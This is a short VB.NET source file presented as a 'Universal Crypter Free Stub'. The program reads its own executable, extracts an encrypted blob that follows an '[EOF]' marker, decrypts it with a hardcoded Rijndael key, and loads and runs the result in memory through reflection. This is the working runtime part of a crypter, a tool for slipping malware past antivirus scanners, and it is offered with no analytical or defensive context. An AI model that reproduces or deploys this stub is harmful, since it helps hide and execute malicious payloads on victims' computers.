Imports System
Imports System.IO
Imports System.Reflection
Imports System.Security.Cryptography
Imports System.Text

' Universal Crypter Free Stub. All Rights Reserved
Friend Module Module1

    <STAThread>
    Sub Main()
        Dim filePath As String = Path.Combine(Environment.CurrentDirectory, AppDomain.CurrentDomain.FriendlyName.Replace(".vshost", ""))

        If File.Exists(filePath) Then
            Dim fileContent As String = File.ReadAllText(filePath)
            Dim password As String = "PzRt12XnQb8765Yt"

            Dim rijAlg As New RijndaelManaged()
            rijAlg.Key = Encoding.ASCII.GetBytes(password)
            rijAlg.IV = Encoding.ASCII.GetBytes(password)
            Dim decryptor As ICryptoTransform = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV)

            Dim msDecrypt As New MemoryStream()
            Dim csDecrypt As New CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Write)

            If fileContent.Contains("[EOF]") Then
                Dim base64 As Byte() = Convert.FromBase64String(fileContent.Substring(fileContent.IndexOf("[EOF]") + "[EOF]".Length))

                csDecrypt.Write(base64, 0, base64.Length)
                csDecrypt.Close()

                Dim asm As Assembly = Assembly.Load(msDecrypt.ToArray())

                Dim entryPoint = asm.EntryPoint
                If entryPoint IsNot Nothing Then
                    entryPoint.Invoke(Nothing, New Object() {})
                End If
            End If
        Else

        End If
    End Sub

End Module
